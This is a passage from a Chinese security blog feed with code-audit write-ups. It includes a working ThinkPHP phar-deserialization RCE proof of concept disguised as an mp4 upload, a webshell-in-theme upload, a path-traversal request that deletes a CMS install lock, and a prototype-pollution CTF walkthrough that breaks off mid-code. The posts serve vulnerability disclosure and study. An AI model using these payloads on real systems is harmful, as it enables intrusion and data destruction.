    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载源码：<a href="http://down.chinaz.com/soft/39542.htm">http://down.chinaz.com/soft/39542.htm</a></p><p>创建数据库，导入sql</p><p><a href="https://imgtu.com/i/hGIf56"><img src="https://z3.ax1x.com/2021/08/29/hGIf56.png" alt="hGIf56.png"></a></p><p>/config/database.php</p><p>修改数据库连接信息</p><p><a href="https://imgtu.com/i/hGI4PK"><img src="https://z3.ax1x.com/2021/08/29/hGI4PK.png" alt="hGI4PK.png"></a></p><p>安装成功</p><p><a href="https://imgtu.com/i/hGII2D"><img src="https://z3.ax1x.com/2021/08/29/hGII2D.png" alt="hGII2D.png"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>&#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Model</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">withAttr</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;withAttr=[<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-string">&#x27;system&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;data=[<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-string">&#x27;whoami&#x27;</span>];<br>        &#125;<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>&#123;<br><br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span> &#123;<br>    <span class="hljs-title">use</span> \<span class="hljs-title">think</span>\<span class="hljs-title">Model</span>\<span class="hljs-title">Pivot</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Process</span>;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pipes</span></span><br><span class="hljs-class">    </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Pipes</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;files=[<span class="hljs-keyword">new</span> Pivot()];<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//echo urlencode(serialize(new Windows()));</span><br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar<br><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> think\process\pipes\Windows();<br><br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行poc生成phar.phar文件，然后把后缀名改为mp4</p><p><a href="https://imgtu.com/i/hGIbqA"><img src="https://z3.ax1x.com/2021/08/29/hGIbqA.png" alt="hGIbqA.png"></a></p><p>登录后台，在编辑文章内容中上传视频文件</p><p><a href="https://imgtu.com/i/hGIoxe"><img src="https://z3.ax1x.com/2021/08/29/hGIoxe.png" alt="hGIoxe.png"></a></p><p>上传phar.mp4文件</p><p><a href="https://imgtu.com/i/hGI7KH"><img src="https://z3.ax1x.com/2021/08/29/hGI7KH.png" alt="hGI7KH.png"></a></p><p>点击上传视频的按钮得到回显地址</p><p><a href="https://imgtu.com/i/hGIHrd"><img src="https://z3.ax1x.com/2021/08/29/hGIHrd.png" alt="hGIHrd.png"></a></p><p>利用phar触发反序列化，成功执行命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/admin.php?s=/update/update_exe?upath=phar://./uploads/video/<span class="hljs-number">20210816</span>/<span class="hljs-number">7512</span>b<span class="hljs-number">9</span>eb<span class="hljs-number">69</span>b<span class="hljs-number">9</span>a<span class="hljs-number">05</span>a<span class="hljs-number">6</span>fb<span class="hljs-number">461835</span>f<span class="hljs-number">86630</span>a.mp<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hGILVI"><img src="https://z3.ax1x.com/2021/08/29/hGILVI.png" alt="hGILVI.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>/application/admin/controller/Update.php</p><p>update_exe将可控参数$upath传入opendir，可触发phar反序列化，配合thinkphp5反序列化利用链即可实现RCE。</p><p><a href="https://imgtu.com/i/hGI58O"><img src="https://z3.ax1x.com/2021/08/29/hGI58O.png" alt="hGI58O.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码审计：Catfishcms后台文件上传漏洞</title>
    <link href="/2021/08/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ACatfishcms%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/08/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ACatfishcms%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>/application/admin/controller/Index.php</p><p>uploadtheme方法没有判断压缩文件内容，直接解压到public目录下，造成文件上传漏洞</p><p><a href="https://imgtu.com/i/fhAVC8"><img src="https://z3.ax1x.com/2021/08/17/fhAVC8.png" alt="fhAVC8.png"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>下载主题压缩包<strong>，</strong>加入webshell后重新压缩</p><p><a href="http://www.catfish-cms.com/article/68.html">http://www.catfish-cms.com/article/68.html</a></p><p><a href="https://imgtu.com/i/fhAFEt"><img src="https://z3.ax1x.com/2021/08/17/fhAFEt.png" alt="fhAFEt.png"></a></p><p><a href="https://imgtu.com/i/fhAPHI"><img src="https://z3.ax1x.com/2021/08/17/fhAPHI.png" alt="fhAPHI.png"></a></p><p>登陆后台</p><p><a href="https://imgtu.com/i/fhACDA"><img src="https://z3.ax1x.com/2021/08/17/fhACDA.png" alt="fhACDA.png"></a></p><p>进入系统设置-&gt;主题，上传修改后的主题</p><p><a href="https://imgtu.com/i/fhAkUP"><img src="https://z3.ax1x.com/2021/08/17/fhAkUP.png" alt="fhAkUP.png"></a></p><p>访问/public/dismalCMS/1.php,成功getshell</p><p><a href="https://imgtu.com/i/fhA9ud"><img src="https://z3.ax1x.com/2021/08/17/fhA9ud.png" alt="fhA9ud.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>文件解压功能经常存在文件上传漏洞</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码审计：YUNUCMS后台文件删除漏洞</title>
    <link href="/2021/08/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AYUNUCMS%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/08/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AYUNUCMS%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>官网：<a href="http://www.yunucms.com/code/fenzhan/">http://www.yunucms.com/code/fenzhan/</a></p><p>源码下载地址：<a href="http://www.yunucms.com/download/citycode/">http://www.yunucms.com/download/citycode/</a></p><p>下载源码后在本地搭建，登录后台</p><p><a href="https://imgtu.com/i/fhkON6"><img src="https://z3.ax1x.com/2021/08/17/fhkON6.png" alt="fhkON6.png"></a></p><p>安装锁install.lock文件位于./data目录下</p><p><a href="https://imgtu.com/i/fhk7u9"><img src="https://z3.ax1x.com/2021/08/17/fhk7u9.png" alt="fhk7u9.png"></a></p><p>发送数据包</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/index.php?s=/</span>admin<span class="hljs-regexp">/upload/</span>delfile<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/fhkLAx"><img src="https://z3.ax1x.com/2021/08/17/fhkLAx.png" alt="fhkLAx.png"></a></p><p>成功删除文件</p><p><a href="https://imgtu.com/i/fhkX4K"><img src="https://z3.ax1x.com/2021/08/17/fhkX4K.png" alt="fhkX4K.png"></a></p><p>数据包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php?s=/admin/upload/delfile HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">90</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">90</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">50</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://localhost/<br><span class="hljs-attribute">Cookie</span>: cookieconsent_status=dismiss; Hm_lvt_c<span class="hljs-number">12</span>f<span class="hljs-number">88</span>b<span class="hljs-number">5</span>c<span class="hljs-number">1</span>cd<span class="hljs-number">041</span>a<span class="hljs-number">732</span>dea<span class="hljs-number">597</span>a<span class="hljs-number">5</span>ec<span class="hljs-number">94</span>c=<span class="hljs-number">1609381035</span>; bdshare_firstime=<span class="hljs-number">1609381035017</span>; Hm_lvt_d<span class="hljs-number">6</span>ceebbfea<span class="hljs-number">56</span>af<span class="hljs-number">954</span>e<span class="hljs-number">58</span>ccea<span class="hljs-number">336</span>c<span class="hljs-number">10</span>d<span class="hljs-number">8</span>=<span class="hljs-number">1612666019</span>,<span class="hljs-number">1614563564</span>; UM_distinctid=<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>c<span class="hljs-number">31</span>-<span class="hljs-number">0</span>aacb<span class="hljs-number">8</span>a<span class="hljs-number">3</span>b<span class="hljs-number">601</span>b<span class="hljs-number">4</span>-<span class="hljs-number">4</span>c<span class="hljs-number">3</span>f<span class="hljs-number">227</span>c-<span class="hljs-number">1</span>fa<span class="hljs-number">400</span>-<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>d<span class="hljs-number">5</span>d<span class="hljs-number">8</span>; CNZZDATA<span class="hljs-number">1277972876</span>=<span class="hljs-number">1856010917</span>-<span class="hljs-number">1614837798</span>-%<span class="hljs-number">7</span>C<span class="hljs-number">1614837798</span>; Hm_lvt_b<span class="hljs-number">60316</span>de<span class="hljs-number">6009</span>d<span class="hljs-number">5654</span>de<span class="hljs-number">7312</span>f<span class="hljs-number">772162</span>be=<span class="hljs-number">1621413156</span>,<span class="hljs-number">1621496582</span>; KCFINDER_showname=<span class="hljs-literal">on</span>; KCFINDER_showsize=<span class="hljs-literal">off</span>; KCFINDER_showtime=<span class="hljs-literal">off</span>; KCFINDER_order=name; KCFINDER_orderDesc=<span class="hljs-literal">off</span>; KCFINDER_view=thumbs; KCFINDER_displaySettings=<span class="hljs-literal">off</span>; PHPSESSID=qmauv<span class="hljs-number">143</span>mirkico<span class="hljs-number">0</span>dfo<span class="hljs-number">1</span>pemdog<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-Site: cross-site<br><br><span class="hljs-attribute">filename</span>=.%<span class="hljs-number">2</span>Fuploads%<span class="hljs-number">2</span>F..%<span class="hljs-number">5</span>C%<span class="hljs-number">5</span>Cdata%<span class="hljs-number">2</span>Finstall.LOCK<br></code></pre></td></tr></table></figure><p>再次访问网站首页，成功进入安装界面，此时可以覆盖安装</p><p><a href="https://imgtu.com/i/fhkv9O"><img src="https://z3.ax1x.com/2021/08/17/fhkv9O.png" alt="fhkv9O.png"></a></p><p>安装过程中的账号验证可以填自己注册的，不会影响利用</p><p><a href="https://imgtu.com/i/fhkx3D"><img src="https://z3.ax1x.com/2021/08/17/fhkx3D.png" alt="fhkx3D.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>/app/admin/controller/Upload.php</p><p>delfile方法中调用了unlink删除文件，参数$filename可控，不过传入的参数先经过了checkfileok函数过滤</p><p><a href="https://imgtu.com/i/fhkbH1"><img src="https://z3.ax1x.com/2021/08/17/fhkbH1.png" alt="fhkbH1.png"></a></p><p>在checkfileok函数中，需要绕过三个if的判断</p><ol><li>第一个in_array可以用大写后缀名绕过，仅在Windows下可用（WIndows文件不区分大小写）</li><li>过滤了<code>../</code>，可以用<code>..\\</code>绕过</li><li>文件名必须包含<code>./uploads/</code></li></ol><p><a href="https://imgtu.com/i/fhkHBR"><img src="https://z3.ax1x.com/2021/08/17/fhkHBR.png" alt="fhkHBR.png"></a></p><p>最后构造payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/uploads/</span>..\\data/install.LOCK<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本来想利用重装界面的数据库连接功能配合Mysql恶意服务端进行任意文件读取，但是试了几个工具都宣告失败，原因未知。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript原型链污染学习</title>
    <link href="/2021/08/11/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/08/11/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>在 JavaScript 中，没有父类和子类这个概念，也没有类和实例的区分，而 JavaScript 中的继承关系则是靠一种叫做 “原型链” 的模式来实现的。</p><p>如果要定义一个类，需要以定义“构造函数”的方式来定义。例如下面的Foo函数就是Foo类的构造函数，this.bar就是Foo类的一个属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Foo</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.bar = <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-keyword">new</span> Foo()<br></code></pre></td></tr></table></figure><p>在类中定义show方法，这种写法会在每次新建一个Foo对象时执行<code>this.show = function...</code>，也就是说这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p><p><a href="https://imgtu.com/i/fa7Sdx"><img src="https://z3.ax1x.com/2021/08/11/fa7Sdx.png" alt="fa7Sdx.png"></a></p><p>如果要在创建类时只创建一次show方法，就需要使用原型（prototype）</p><ul><li>原型（prototype）是类Foo的一个属性</li><li>所有用Foo类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。例如foo对象天生就具有<code>foo.show()</code>方法</li></ul><p><a href="https://imgtu.com/i/faTXQJ"><img src="https://z3.ax1x.com/2021/08/11/faTXQJ.png" alt="faTXQJ.png"></a></p><p>访问原型的方式：</p><ol><li><p>访问Foo类的原型：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-type">Foo</span>.proto<span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure></li><li><p>访问Foo类实例化出来的对象的原型：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">foo.<span class="hljs-strong">__proto__</span><br></code></pre></td></tr></table></figure></li></ol><p>总结</p><ul><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ul><h2 id="继承机制"><a href="#继承机制" class="headerlink" title="继承机制"></a>继承机制</h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p><p>这里Son类继承了Father类的last_name。调用<code>son.last_name</code>时会先在Son对象中寻找目标，然后是<code>son.__proto__</code>，再找不到就是<code>son.__proto__.__proto__</code>，一直循环下去直到找到null结束</p><p><a href="https://imgtu.com/i/faTze1"><img src="https://z3.ax1x.com/2021/08/11/faTze1.png" alt="faTze1.png"></a></p><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li><code>foo.__proto__</code>指向OBject类的prototype，修改它就可以修改Object类</li><li>foo是Object类的实例，执行<code>foo.__proto__.bar = 2</code>相当于给Object类添加了一个bar属性，值为2</li><li>后面用Object类创建了一个zoo对象，自然就有bar属性了</li></ul><p><a href="https://imgtu.com/i/fa7po6"><img src="https://z3.ax1x.com/2021/08/11/fa7po6.png" alt="fa7po6.png"></a></p><h2 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h2><p>原型链污染常出现于能够控制数组（对象）的“键名”的操作：</p><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>未能成功污染原型链，原因是在执行<code>let o2=&#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;</code>时，<code>__proto__</code>已经代表o2的原型，这样在执行<code>for (let key in source)</code>遍历o2的键名时就不会把<code>__proto__</code>当作一个key，不会修改Object原型</p><p><a href="https://imgtu.com/i/fa7CFK"><img src="https://z3.ax1x.com/2021/08/11/fa7CFK.png" alt="fa7CFK.png"></a></p><p>需要加上JSON解析才能让<code>__proto__</code>被认定为是一个键名，从而成功污染原型链</p><p><a href="https://imgtu.com/i/fa7PJO"><img src="https://z3.ax1x.com/2021/08/11/fa7PJO.png" alt="fa7PJO.png"></a></p><h1 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li>存在大小写转换函数（toUpperCase），利用特殊字符绕过登录admin</li><li>merge+clone，js原型链污染</li></ol><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>开始是一个登录界面</p><p><a href="https://imgtu.com/i/faTbJU"><img src="https://z3.ax1x.com/2021/08/11/faTbJU.png" alt="faTbJU.png"></a></p><p>下载<a href="http://www.zip/">www.zip</a></p><p>在routes目录下有index.js，可以看到有merge和clone，可以判断是原型链污染</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span>;<br><span class="hljs-keyword">const</span> merge = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;<br>      merge(a[attr], b[attr]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[attr] = b[attr];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a<br>&#125;<br><span class="hljs-keyword">const</span> clone = <span class="hljs-function">(<span class="hljs-params">a</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> merge(&#123;&#125;, a);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeKeyword</span>(<span class="hljs-params">keyword</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(keyword.match(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span><br>&#125;<br><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(!req.session.user)&#123;<br>    res.redirect(<span class="hljs-string">&#x27;/login&#x27;</span>);<br>  &#125;<br>  res.outputFunctionName=<span class="hljs-literal">undefined</span>;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:req.session.user.user&#125;);<br>&#125;);<br><br><br>router.get(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;);<br><br><br><br>router.post(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.body.Submit==<span class="hljs-string">&quot;register&quot;</span>)&#123;<br>   <span class="hljs-keyword">if</span>(safeKeyword(req.body.userid))&#123;<br>    res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br>    req.session.user=&#123;<br>      <span class="hljs-string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),<br>      <span class="hljs-string">&#x27;passwd&#x27;</span>: req.body.pwd,<br>      <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>    &#125;<br>    res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); <br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.body.Submit==<span class="hljs-string">&quot;login&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!req.session.user)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;<br>    <span class="hljs-keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;<br>      req.session.user.isLogin=<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>      res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error 